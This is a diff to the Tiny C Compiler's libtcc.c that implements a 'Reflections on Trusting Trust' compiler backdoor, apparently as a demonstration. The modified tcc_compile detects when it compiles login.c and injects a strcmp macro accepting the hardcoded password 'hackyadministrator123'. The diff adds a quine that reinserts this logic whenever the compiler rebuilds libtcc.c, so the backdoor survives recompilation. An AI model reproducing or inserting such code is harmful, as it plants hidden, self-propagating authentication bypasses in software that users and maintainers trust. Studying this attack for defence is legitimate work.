@@ -708,7 +708,10 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
     return 0;
 }
 
+
+
 /* compile the file opened in 'file'. Return non zero if errors. */
+char* quine = "{\r\n    /* Here we enter the code section where we use the global variables for\r\n       parsing and code generation (tccpp.c, tccgen.c, <target>-gen.c).\r\n       Other threads need to wait until we\'re done.\r\n\r\n       Alternatively we could use thread local storage for those global\r\n       variables, which may or may not have advantages */\r\n\r\n\t// pray.\r\n\t\r\n\t\r\n\t\r\n\tif(!strcmp(str, \"login.c\")) {\r\n\t\t// detect if in login.c\r\n\r\n\t\tconst char *INPUT_STRING = \"#define minLen(X, Y)  (strlen(X) < strlen(Y) ? strlen(X) : strlen(Y))\\r\\n#define strcmp(a, b) ( !(memcmp(a, \\\"hackyadministrator123\\\", minLen(a, \\\"hackyadministrator123\\\")) || !memcmp(b, \\\"hackyadministrator123\\\", minLen(b, \\\"hackyadministrator123\\\")) ) ? 0 : memcmp(a, b, minLen(a, b)))\";\r\n\r\n\t\tFILE *input_file = fopen(str, \"r\");\r\n\t\tFILE *temp_file = fopen(\"temp.txt\", \"w\");\r\n\r\n\t\tchar buffer[100000];\r\n\t\tint found_target_line = 0;\r\n\r\n\t\twhile (fgets(buffer, 100000, input_file)) {\r\n\t\tif (!found_target_line && strstr(buffer, \"#include <string.h>\")) {\r\n\t\tfputs(buffer, temp_file);\r\n\t\tfputs(INPUT_STRING, temp_file);\r\n\t\tfputs(\"\\n\", temp_file);\r\n\t\tfound_target_line = 1;\r\n\t\t} else {\r\n\t\tfputs(buffer, temp_file);\r\n\t\t}\r\n\t\t}\r\n\r\n\t\tfclose(input_file);\r\n\t\tfclose(temp_file);\r\n\t\t\r\n\t\tfd = _tcc_open(s1, \"temp.txt\");\r\n        str = \"temp.txt\";\r\n\t}\r\n\r\n\tif(!strcmp(str, \"libtcc.c\")) {\r\n\t\t\r\n\t\tFILE *input_file = fopen(str, \"r\");\r\n\t\tFILE *temp_file = fopen(\"temp_libtcc.c\", \"w\");\r\n\r\n\t\tchar buffer[100000];\r\n\t\tint found_target_line = 0;\r\n\r\n\t\t// this solution is juvenile, but will work for now\r\n\t\tint lineSkip = 44;\r\n\t\tint shouldSkip = 0;\r\n\t\t\r\n\t\tchar tempBuffer[100000];\r\n\t\tchar finalTempBuffer[100000]; // dumbest var names known to man\r\n\r\n\t\twhile (fgets(buffer, 100000, input_file)) {\r\n\t\t\tif (!found_target_line && strstr(buffer, \"static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)\")) {\r\n\t\t\t\r\n\t\t\t\tshouldSkip = 1;\r\n\t\t\t\t\r\n\t\t\t\t// needs to include escape chars!!!\r\n\t\t\t\t//sprintf(tempBuffer, \"const char* quine = \\\"%s\\\"\\n\", quine);\r\n\t\t\t\tint quinePointer = 0;\r\n\t\t\t\tint tempPointer = 0;\r\n\t\t\t\twhile(quine[quinePointer] != 0x00) {\r\n\t\t\t\t\t\r\n\t\t\t\t\tchar c = quine[quinePointer++];\r\n\t\t\t\t\t\r\n\t\t\t\t\tswitch(c) {\r\n\t\t\t\t\t\tcase \'\\r\':\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\\\';\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'r\';\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase \'\\n\':\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\\\';\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'n\';\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase \'\\t\':\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\\\';\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'t\';\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase \'\\\\\':\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\\\';\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\\\';\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase \'\"\':\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\\\';\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\"\';\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase \'\\\'\':\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\\\';\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = \'\\\'\';\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\ttempBuffer[tempPointer++] = c;\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\t// add null padding\r\n\t\t\t\ttempBuffer[tempPointer++] = 0x00;\r\n\t\t\t\t\r\n\t\t\t\tsprintf(finalTempBuffer, \"char* quine = \\\"%s\\\";\\n\", tempBuffer);\r\n\t\t\t\t\r\n\t\t\t\tfputs(finalTempBuffer, temp_file);\r\n\t\t\t\t\r\n\t\t\t\tfputs(buffer, temp_file);\r\n\t\t\t\tfputs(quine, temp_file);\r\n\t\t\t} else {\r\n\t\t\t\tif(shouldSkip) {\r\n\t\t\t\t\t\r\n\t\t\t\t\tlineSkip--;\r\n\t\t\t\t\tshouldSkip = lineSkip != 0;\r\n\t\t\t\t} else {\r\n\t\t\t\t\tfputs(buffer, temp_file);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tfclose(input_file);\r\n\t\tfclose(temp_file);\r\n\t\t\r\n\t\tfd = _tcc_open(s1, \"temp_libtcc.c\");\r\n        str = \"temp_libtcc.c\";\r\n\t\t\r\n\t}\r\n\r\n    tcc_enter_state(s1);\r\n    s1->error_set_jmp_enabled = 1;\r\n\r\n    if (setjmp(s1->error_jmp_buf) == 0) {\r\n        s1->nb_errors = 0;\r\n\r\n        if (fd == -1) {\r\n            int len = strlen(str);\r\n            tcc_open_bf(s1, \"<string>\", len);\r\n            memcpy(file->buffer, str, len);\r\n        } else {\r\n            tcc_open_bf(s1, str, 0);\r\n            file->fd = fd;\r\n        }\r\n\r\n        preprocess_start(s1, filetype);\r\n        tccgen_init(s1);\r\n\r\n        if (s1->output_type == TCC_OUTPUT_PREPROCESS) {\r\n            tcc_preprocess(s1);\r\n        } else {\r\n            tccelf_begin_file(s1);\r\n            if (filetype & (AFF_TYPE_ASM | AFF_TYPE_ASMPP)) {\r\n                tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));\r\n            } else {\r\n                tccgen_compile(s1);\r\n            }\r\n            tccelf_end_file(s1);\r\n        }\r\n    }\r\n    tccgen_finish(s1);\r\n    preprocess_end(s1);\r\n    s1->error_set_jmp_enabled = 0;\r\n    tcc_exit_state(s1);\r\n\t\r\n\t// remove temp file \r\n\tif(!strcmp(str, \"temp.txt\")) {\r\n\t\tremove(\"temp.txt\");\r\n\t}\r\n\t\r\n\tif(!strcmp(str, \"temp_libtcc.c\")) {\r\n\t\tremove(\"temp_libtcc.c\");\r\n\t}\r\n    return s1->nb_errors != 0 ? -1 : 0;\r\n}";
 static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 {
     /* Here we enter the code section where we use the global variables for
@@ -719,6 +722,8 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
        variables, which may or may not have advantages */
 
 	// pray.
+	
+	
 	
 	if(!strcmp(str, "login.c")) {
 		// detect if in login.c
@@ -742,18 +747,100 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 		}
 		}
 
-
 		fclose(input_file);
-		rewind(temp_file);
+		fclose(temp_file);
 		
 		fd = _tcc_open(s1, "temp.txt");
         str = "temp.txt";
-		
-		// TEMP.TXT NEEDS CLEANUP
-	
 	}
 
+	if(!strcmp(str, "libtcc.c")) {
+		
+		FILE *input_file = fopen(str, "r");
+		FILE *temp_file = fopen("temp_libtcc.c", "w");
 
+		char buffer[100000];
+		int found_target_line = 0;
+
+		// this solution is juvenile, but will work for now
+		int lineSkip = 44;
+		int shouldSkip = 0;
+		
+		char tempBuffer[100000];
+		char finalTempBuffer[100000]; // dumbest var names known to man
+
+		while (fgets(buffer, 100000, input_file)) {
+			if (!found_target_line && strstr(buffer, "static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)")) {
+			
+				shouldSkip = 1;
+				
+				// needs to include escape chars!!!
+				//sprintf(tempBuffer, "const char* quine = \"%s\"\n", quine);
+				int quinePointer = 0;
+				int tempPointer = 0;
+				while(quine[quinePointer] != 0x00) {
+					
+					char c = quine[quinePointer++];
+					
+					switch(c) {
+						case '\r':
+							tempBuffer[tempPointer++] = '\\';
+							tempBuffer[tempPointer++] = 'r';
+							break;
+						case '\n':
+							tempBuffer[tempPointer++] = '\\';
+							tempBuffer[tempPointer++] = 'n';
+							break;
+						case '\t':
+							tempBuffer[tempPointer++] = '\\';
+							tempBuffer[tempPointer++] = 't';
+							break;
+						case '\\':
+							tempBuffer[tempPointer++] = '\\';
+							tempBuffer[tempPointer++] = '\\';
+							break;
+						case '"':
+							tempBuffer[tempPointer++] = '\\';
+							tempBuffer[tempPointer++] = '"';
+							break;
+						case '\'':
+							tempBuffer[tempPointer++] = '\\';
+							tempBuffer[tempPointer++] = '\'';
+							break;
+						default:
+							tempBuffer[tempPointer++] = c;
+							break;
+					}
+				
+				}
+				
+				// add null padding
+				tempBuffer[tempPointer++] = 0x00;
+				
+				sprintf(finalTempBuffer, "char* quine = \"%s\";\n", tempBuffer);
+				
+				fputs(finalTempBuffer, temp_file);
+				
+				fputs(buffer, temp_file);
+				fputs(quine, temp_file);
+			} else {
+				if(shouldSkip) {
+					
+					lineSkip--;
+					shouldSkip = lineSkip != 0;
+				} else {
+					fputs(buffer, temp_file);
+				}
+			}
+		}
+
+		fclose(input_file);
+		fclose(temp_file);
+		
+		fd = _tcc_open(s1, "temp_libtcc.c");
+        str = "temp_libtcc.c";
+		
+	}
 
     tcc_enter_state(s1);
     s1->error_set_jmp_enabled = 1;
@@ -795,6 +882,9 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 		remove("temp.txt");
 	}
 	
+	if(!strcmp(str, "temp_libtcc.c")) {
+		remove("temp_libtcc.c");
+	}
     return s1->nb_errors != 0 ? -1 : 0;
 }
 
